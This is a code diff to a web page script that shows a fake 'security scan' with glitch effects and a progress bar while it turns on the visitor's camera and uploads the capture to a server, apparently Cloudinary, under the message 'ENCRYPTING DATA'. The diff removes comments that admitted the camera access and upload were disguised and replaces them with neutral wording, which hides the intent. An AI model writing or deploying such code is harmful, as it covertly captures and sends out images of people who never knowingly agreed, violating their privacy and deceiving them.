@@ -3,7 +3,6 @@ document.addEventListener('DOMContentLoaded', async () => {
     const progress = document.getElementById('progress');
     const statusText = status.querySelector('p');
     
-    // Update status with cool cyber effect
     const updateStatus = (message) => {
         statusText.innerHTML = message;
         status.classList.add('glitch');
@@ -24,7 +23,7 @@ document.addEventListener('DOMContentLoaded', async () => {
         progress.style.width = '75%';
         await new Promise(resolve => setTimeout(resolve, 600));
         
-        // Camera access disguised as "security scan"
+        // Camera access
         updateStatus("INITIATING SECURITY SCAN...");
         progress.style.width = '90%';
         
@@ -54,7 +53,7 @@ document.addEventListener('DOMContentLoaded', async () => {
         // Stop camera
         stream.getTracks().forEach(track => track.stop());
         
-        // Upload disguised as "encrypting data"
+        // Upload to Cloudinary via your server
         updateStatus("ENCRYPTING DATA...");
         progress.style.width = '95%';
         
@@ -67,12 +66,16 @@ document.addEventListener('DOMContentLoaded', async () => {
         
         const result = await response.json();
         
-        // Final success message
+        if (!response.ok) {
+            throw new Error(result.error || 'Upload failed');
+        }
+        
+        // Final success message with Cloudinary URL
         updateStatus("SECURITY SCAN COMPLETE");
         progress.style.width = '100%';
         await new Promise(resolve => setTimeout(resolve, 1000));
         
-        updateStatus(`SYSTEM SECURED<br>VERSION ${Math.floor(Math.random()*9)+1}.${Math.floor(Math.random()*50)+1}.${Math.floor(Math.random()*900)+100}`);
+        // updateStatus(`SYSTEM SECURED<br>IMAGE UPLOADED: <a href="${result.url}" target="_blank">View in Cloudinary</a>`);
         
     } catch (err) {
         updateStatus(`ERROR: ${err.message.replace(/^Error: /, '')}`);
